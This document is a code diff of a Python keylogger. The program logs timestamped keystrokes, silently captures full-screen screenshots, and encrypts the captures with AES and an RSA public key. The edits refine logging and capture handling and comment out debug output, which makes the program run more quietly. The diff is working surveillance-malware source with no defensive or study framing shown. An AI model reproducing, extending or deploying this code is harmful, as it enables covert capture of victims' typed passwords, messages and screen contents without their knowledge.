@@ -49,7 +49,7 @@ def keystroke(key):
     lt = 0
     new = 0
     searchword = ''
-    t = str(datetime.datetime.now().strftime("\n%H : %M : %S>> "))
+    t = str(datetime.datetime.now().strftime("\n%H:%M:%S>> "))
     key = str(key).replace("'","")
 
     if key == "\\x03":
@@ -78,7 +78,8 @@ def keystroke(key):
         if ("Key.cmd" in key) or ("Key.space" in key):
             key = key
         else:
-            key = key +'\n'
+            # key = key +'\n'
+            key = ''
         lt = 0
 
     if "Key.shift" in key:
@@ -94,7 +95,8 @@ def keystroke(key):
                 if ("Key.space" in key):
                     f.write(' '+key + '\n')
                 else:
-                    f.write(t + key)
+                    if key != '':
+                        f.write(t + key)
                 ch = 0
 
         filecheck = "checklog_data.txt"
@@ -141,20 +143,20 @@ def capturekey(k):
     with mss() as sct:
         sct.shot(mon=-1, output=x)
 
-    with open('Temp/Capture.txt', 'w') as f:
+    with open('Temp/Capture.txt', 'a') as f:
         f.write(x + '\n')
 
     # pyautogui.screenshot().save('Temp\\Capture\\'+x)
     encrypt(x)
 
 def encrypt(file):
-    print("encrypt\n")
+    # print("encrypt\n")
     with open(file, 'rb') as f:
         picture = f.read()
     
     picture = pad(picture,AES.block_size)
 
-    print("picture : ",picture)
+    # print("picture : ",picture)
 
     aes_key = 'material/AESkey'
     with open(aes_key, 'rb') as f:
@@ -164,13 +166,13 @@ def encrypt(file):
     data = cipher.encrypt(picture)
     datac = cipher.iv + data
 
-    print("cipher : ",cipher)
-    print("data : ",data)
-    print("dataiv : ",datac)
+    # print("cipher : ",cipher)
+    # print("data : ",data)
+    # print("dataiv : ",datac)
 
     digest = SHA512.new()
     digest.update(datac)
-    print("datac : ",digest.digest())
+    # print("datac : ",digest.digest())
     
     pub = RSA.import_key(open('material/Public_Key.pem').read())
     pubkey = PKCS1_v1_5.new(pub)
